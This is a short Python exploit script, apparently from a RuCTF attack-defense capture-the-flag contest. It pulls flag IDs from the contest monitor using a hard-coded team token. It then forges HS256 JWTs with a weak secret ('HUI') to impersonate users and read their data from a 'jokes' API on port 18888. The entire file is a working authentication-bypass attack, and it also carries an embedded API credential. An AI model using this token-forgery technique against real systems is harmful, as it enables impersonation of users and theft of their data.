#!/usr/bin/env python3
import sys
import requests
import jwt

host = sys.argv[1]

def get_id(host):
    headers = {
    'X-Team-Token': 'CLOUD_27_fccf28fc5ad2afc6eb2c33cdc9f9d0c5',
    }
    params = {
    'service': "4",
    }
    dataJson = requests.get('https://monitor.ructf.org/flag_ids', params=params, headers=headers).json()
    for i in range(1,36):
        if dataJson['flag_ids'][str(i)]['host'] == host:
            return dataJson['flag_ids'][str(i)]['flag_ids']

names = get_id(host)
host = sys.argv[1]


def sign_token(user):
    token=jwt.encode({"username": user}, "HUI", algorithm="HS256")
    return token

for name in names:
    user = name.split('+')[0]
    print(user)
    token = sign_token(user)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate',
        'Referer': f'http://{host}:18888/',
        'Authorization': f'Bearer {token}',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    response = requests.get(f'http://{host}:18888/api/jokes/list', headers=headers)
    print(response.text, flush=True)

